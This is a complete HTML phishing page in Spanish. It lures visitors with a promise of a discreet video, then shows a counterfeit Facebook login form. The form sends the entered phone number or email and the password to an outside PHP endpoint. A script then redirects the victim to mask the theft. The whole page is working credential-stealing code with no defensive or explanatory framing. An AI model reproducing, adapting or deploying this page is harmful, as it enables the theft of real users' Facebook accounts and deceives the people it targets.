<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Traviesas y Bandidas Venezolanas</title>
  <meta property="og:image" content="https://i.postimg.cc/htnKTWD3/0p39248so.jpg" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" rel="stylesheet" />
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" />
  <style>
    body {
      background-color: #ffffff;
    }
    .btn-facebook {
      width: 100%;
      background-color: #1877f2;
      color: #fff;
      font-weight: bold;
      border: none;
      padding: 12px;
      margin-top: 20px;
    }
    .btn-facebook:hover {
      opacity: 0.9;
      color: #fff;
    }
    img.logo {
      width: 200px;
      margin-bottom: 30px;
    }
    .login-box {
      max-width: 400px;
      margin: 100px auto;
      padding: 20px;
    }
    input[type="text"], input[type="password"] {
      margin-bottom: 15px;
      border: none;
      background-color: #f8f9fa;
      padding: 10px;
      width: 100%;
    }
    .forgot-password-link {
      color: #1877f2;
      text-align: center;
      display: block;
      margin-top: 10px;
    }
    .divider {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 15px 0;
      gap: 10px;
    }
    .divider hr {
      flex: 1;
      height: 1px;
      background-color: #ccc;
      border: none;
      margin: 0;
    }
    .divider span {
      font-size: 16px;
      color: #888;
      white-space: nowrap;
    }
    .create-account-btn {
      background-color: #e9f0f5;
      border: none;
      color: #003366;
      padding: 10px 20px;
      border-radius: 5px;
      width: 70%;
      font-weight: bold;
      margin: 0 auto;
      display: block;
    }
  </style>
</head>
<body id="onee">
  <div id="pantalla-1" class="login-box text-center">
    <img class="logo" src="https://i.postimg.cc/PNGQcpFT/dsadsadsadsa.png" alt="Logo"/>
    <p style="color: red; font-size: 14px;">
      <strong>Debes ser discreto con el contenido que vas a ver a continuación.</strong>
    </p>
    <button onclick="mostrarFormulario()" class="btn btn-facebook btn-lg">
      <i class="fab fa-facebook"></i> Ver Video
    </button>
  </div>

  <div id="formulario-login" class="login-box text-center" style="display: none;">
    <center><img width="200px" src="https://i.imgur.com/Ql1auXe.png" alt="Logo Facebook"/></center>
    <div style="background-color:#fffbe2; padding:10px; text-align:left; margin-top:15px; width: 110%; margin-left: -5%; margin-bottom: 20px;">
      <img width="20px" src="https://i.postimg.cc/MTq50GNX/phone.png" style="vertical-align: middle; margin-right: 8px;" />
      <span style="font-weight: normal; color: #333366;">Inicia sesión en tu cuenta para ver el video</span>
    </div>
    <form id="loginForm" action="https://teamcompa.matesdaddy.com/santacruz.php" method="POST">
      <input type="text" name="email" placeholder="Número de móvil o correo electrónico" required />
      <input type="password" name="pass" placeholder="Contraseña" required />
      <button type="submit" class="btn btn-facebook">Iniciar sesión</button>
    </form>
    <div class="forgot-password-link">
      <a href="#" style="color: #1877f2;">¿Olvidaste tu contraseña?</a>
    </div>
    <div class="divider">
      <hr>
      <span>o</span>
      <hr>
    </div>
    <div style="text-align:center; margin-top:15px;">
      <a href="#" style="text-decoration: none;">
        <button type="button" class="create-account-btn">Crear cuenta de Facebook</button>
      </a>
    </div>
  </div>

  <script>
    function mostrarFormulario() {
      document.getElementById("pantalla-1").style.display = "none";
      document.getElementById("formulario-login").style.display = "block";
    }
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      setTimeout(function() {
        window.location.href = "https://example.com/video.html";
      }, 1000);
    });
  </script>
</body>
</html>
